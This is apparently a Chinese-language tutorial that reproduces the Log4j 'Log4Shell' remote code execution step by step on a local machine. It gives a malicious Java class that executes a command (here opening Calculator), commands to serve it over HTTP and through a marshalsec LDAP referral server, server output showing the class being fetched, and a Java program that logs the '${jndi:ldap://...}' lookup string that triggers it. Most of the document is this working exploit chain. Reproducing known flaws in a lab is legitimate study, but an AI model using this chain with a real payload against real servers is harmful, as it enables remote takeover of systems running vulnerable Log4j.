需要的环境:

- java 1.8.0
- python3

# Log4J 漏洞复现+漏洞靶场

昨天晚上朋友圈算是过了年了，一个log4j大伙都忙了起来，看着朋友圈好久没这么热闹了。Apache 的这个log4j这个影响范围的确是大，包括我自己做开发的时候也会用到log4j，这就很尴尬了。

大家也不要在公网上疯狂测试了，我给大家带来了漏洞靶场，攻击视频在下文，一步一步教你。

漏洞原理我改天会详细的写一篇文章出来，今天就主要是复现一下漏洞。

昨晚爆出的log4j rce 是通过lookup触发的漏洞，但jdk1.8.191以上默认不支持ldap协议，对于高版本jdk,则需要一定的依赖。不过为了给大家最简单的说明，我这里还是用jdk1.8.144的版本来运行。

这个漏洞和fastjson的漏洞利用如出一辙，首先需要编写一个恶意类。

- 第一步：编写恶意代码

```java
public class Exploit {
    public Exploit(){
        try{
            // 要执行的命令
            String[] commands = {"open", "/System/Applications/Calculator.app"};
            Process pc = Runtime.getRuntime().exec(commands);
            pc.waitFor();
        } catch(Exception e){
            e.printStackTrace();
        }
    }

    public static void main(String[] argv) {
        Exploit e = new Exploit();
    }
}
```

这里是弹出计算器

- 第二步：编译成class


```bash
# 第二步：编译成class
javac Exploit.java
```

把这个类编译之后会得到一个Exploit.class，然后需要在当前目录下启动一个web服务，

- 第三步：启动本地服务

```
# 在./java-test/src/main/java 目录下运行
python3 -m http.server 8100

```

```bash

mrgaogang@mrgaogang-MB0 java % python3 -m http.server 8100
Serving HTTP on 0.0.0.0 port 8100 (http://0.0.0.0:8100/) ...

127.0.0.1 - - [28/Feb/2022 22:07:12] "GET / HTTP/1.1" 200 -
127.0.0.1 - - [28/Feb/2022 22:07:15] "GET /Exploit.class HTTP/1.1" 200 -


```

- 第四步：启动ldap服务

然后用[marshalsec](https://github.com/mbechler/marshalsec) IDAP服务，项目地址：[https://github.com/mbechler/marshalsec](https://github.com/mbechler/marshalsec)

```
# 在./java-test/src/main/java 目录下运行
java -cp ./marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:8100/#Exploit"

```

```bash

Listening on 0.0.0.0:1389
Send LDAP reference result for Exploit redirecting to http://127.0.0.1:8100/Exploit.class
Send LDAP reference result for Exploit redirecting to http://127.0.0.1:8100/Exploit.class
Send LDAP reference result for Exploit2 redirecting to http://127.0.0.1:8100/Exploit.class
Send LDAP reference result for aaaa redirecting to http://127.0.0.1:8100/Exploit.class
Send LDAP reference result for  redirecting to http://127.0.0.1:8100/Exploit.class
Send LDAP reference result for aaaaaaa redirecting to http://127.0.0.1:8100/Exploit.class
Send LDAP reference result for aaaaaaa redirecting to http://127.0.0.1:8100/Exploit.class



```
漏洞类


- 第五步：编写漏洞类并启动


```java

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;


public class LogTest {
    private static final Logger logger = LogManager.getLogger(LogTest.class);

    public static void main(String[] args) {
        logger.error(   "${jndi:ldap://127.0.0.1:1389/aaaaaaa}");
    }
}


```

最后运行LogTest下面的main